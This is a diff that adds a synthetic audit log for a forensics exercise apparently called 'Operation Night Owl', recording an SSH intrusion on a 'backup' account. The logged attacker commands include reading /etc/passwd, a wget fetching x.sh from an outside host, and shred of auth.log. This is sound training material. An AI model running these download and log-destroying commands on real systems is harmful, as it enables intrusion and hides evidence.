@@ -1,0 +1,9 @@
+# SCENARIO DATA - Operation Night Owl (synthetic, documentation IP ranges). NOT real evidence.
+type=USER_AUTH msg=audit(1794969180.000:7101): pid=2211 uid=0 auid=4294967295 ses=4294967295 acct="backup" exe="/usr/sbin/sshd" hostname=10.10.20.15 addr=10.10.20.15 terminal=ssh res=failed
+type=USER_AUTH msg=audit(1794969189.000:7102): pid=2211 uid=0 auid=4294967295 ses=4294967295 acct="backup" exe="/usr/sbin/sshd" hostname=10.10.20.15 addr=10.10.20.15 terminal=ssh res=failed
+type=USER_LOGIN msg=audit(1794969210.000:7103): pid=2214 uid=0 auid=1001 ses=12 acct="backup" exe="/usr/sbin/sshd" hostname=10.10.20.15 addr=10.10.20.15 terminal=ssh res=success
+type=EXECVE msg=audit(1794969230.000:7104): argc=3 uid=1001 a0="id"
+type=EXECVE msg=audit(1794969238.000:7105): argc=3 uid=1001 a0="uname" a1="-a"
+type=EXECVE msg=audit(1794969250.000:7106): argc=3 uid=1001 a0="cat" a1="/etc/passwd"
+type=EXECVE msg=audit(1794969265.000:7107): argc=3 uid=1001 a0="wget" a1="http://198.51.100.23/x.sh" a2="-O" a3="/tmp/x.sh"
+type=EXECVE msg=audit(1794969300.000:7108): argc=3 uid=1001 a0="shred" a1="-u" a2="/var/log/auth.log"
